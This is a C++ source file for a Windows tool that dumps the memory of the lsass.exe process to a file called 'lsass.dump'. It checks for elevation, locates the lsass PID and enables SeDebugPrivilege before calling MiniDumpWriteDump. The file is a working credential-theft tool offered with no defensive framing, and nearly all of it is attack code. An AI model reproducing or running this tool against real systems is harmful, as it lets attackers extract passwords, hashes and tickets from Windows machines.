// author : github.com/pwnmit

#include <iostream>
#include <windows.h>
#include <dbghelp.h>
#include <tlhelp32.h> // Required for Toolhelp32 APIs
#include <string>

using namespace std;

bool isElevatedProcess() {
    bool isElevated = false;
    HANDLE access_token = NULL;
    
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &access_token)) {
        TOKEN_ELEVATION elevation;
        DWORD token_check = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(access_token, TokenElevation, &elevation, sizeof(elevation), &token_check)) {
            isElevated = elevation.TokenIsElevated;
        }
    }
    
    if (access_token) {
        CloseHandle(access_token);
    }
    return isElevated;
}

// Changed parameter to std::string to flawlessly match MinGW's default char array
DWORD GetProcessIDByName(const string& processName) {
    DWORD processID = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 processEntry = {};
        processEntry.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(snapshot, &processEntry)) {
            do {
                // Directly construct the string from the process entry buffer
                string currentProcessName(processEntry.szExeFile);
                if (currentProcessName == processName) {
                    processID = processEntry.th32ProcessID; // Fixed: Capitalized 'P'
                    break;
                }
            } while (Process32Next(snapshot, &processEntry));
        }
        CloseHandle(snapshot);
    }
    return processID;
}
bool setPrivilege() {
    string priv_name = "SeDebugPrivilege";
    wstring privilege_name(priv_name.begin(), priv_name.end());
    const wchar_t* privName = privilege_name.c_str();
    TOKEN_PRIVILEGES priv = { 0,0,0,0 };
    HANDLE tokenPriv = NULL;
    LUID luid { 0,0};
    bool status = true;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &tokenPriv)) {
        status = false;
        goto EXIT;
    }
    if(!LookupPrivilegeValueW(0, privName, &luid)) {
        status = false;
        goto EXIT;
    }
    priv.PrivilegeCount = 1;
    priv.Privileges[0].Luid = luid;
    priv.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_REMOVED;

    if(!AdjustTokenPrivileges(tokenPriv, FALSE, &priv, 0, NULL, NULL)) {        status = false;
        goto EXIT;
    }
EXIT:
    if (tokenPriv) {
        CloseHandle(tokenPriv);
        return status;
    }
}

int main() {
    if (isElevatedProcess()) {
        printf("we have the required privileges\n");
    } else {
        printf("don't have the required privileges\n");
    }
    
    // Changed to standard string literal
    string processName = "lsass.exe"; 
    DWORD processPID = GetProcessIDByName(processName);
    
    // Fixed format specifier to %lu for DWORD (unsigned long) and added missing semicolon
    printf("lsass process PID is %lu\n", processPID); 
    
    if (setPrivilege()) {
        printf("seDebugPrivilege is enabled");
    }
    else {
        printf("seDebugPrivilege is not enabled");
    }
    string fileName = "lsass.dump";
    wstring stemp = wstring(fileName.begin(), fileName.end());
    LPCWSTR fileName_pointer = stemp.c_str();
    HANDLE output = CreateFileW(fileName_pointer, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD accessAllow = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
    HANDLE processHandler = OpenProcess(accessAllow, 0, processPID);

    if (processHandler && processHandler != INVALID_HANDLE_VALUE) {
        bool isDump = MiniDumpWriteDump(processHandler,processPID,output, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
        if (isDump) {
            printf("[+] lsass is dumped\n");
        }
        else {
            printf("[-] lsass is not dumped\n");
        }
    }
    getchar();
    return 0;
}
